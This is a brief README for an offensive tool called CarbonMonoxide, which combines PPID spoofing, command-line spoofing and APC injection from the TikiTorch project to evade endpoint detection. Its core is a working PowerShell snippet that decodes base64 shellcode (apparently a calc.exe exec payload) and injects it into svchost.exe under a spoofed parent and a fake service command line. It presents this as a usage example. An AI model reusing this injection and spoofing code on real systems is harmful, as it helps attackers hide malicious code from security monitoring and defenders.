# CarbonMonoxide
EDR Evasion - Combination of SwampThing - TikiTorch

Work in progess.

Essentially combining these elements:

```
1. PPID Spoofing
2. CmdLine Spoofing
3. QAPC Injection
4. TikiTorch (Cobalt Strike Agressor Script)

```

Its a bit easier than I thought. I went ahead and submitted a PR request.  The code here is just fragments. 

https://github.com/rasta-mouse/TikiTorch/pull/13

See this for example.

After experimentation, I settled on c# Optional Parameters to satsify this requirement.

```
$shellcodeTxt = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA"

Add-Type -Path "C:\Users\mobile\Downloads\CarbonMonoxide\TikiTorch-master\TikiLoader\bin\Release\TikiLoader.dll"

[TikiLoader.Injector]::QUAPCInject("C:\windows\system32\svchost.exe",[System.Convert]::Frombase64String($shellcodeTxt), $pid, "svchost.exe -k netsvcs BLAHDEBLAH")

```



Sysmon


Just an example of how to use. You can choose whatever parameters you like for the starting process.

xref: [How to Argue like Cobalt Strike](https://blog.xpnsec.com/how-to-argue-like-cobalt-strike/)

Special Thanks to fuzzysec/rastamouse for their code and projects.  This isn't really anything new. Its simply an adaptation.


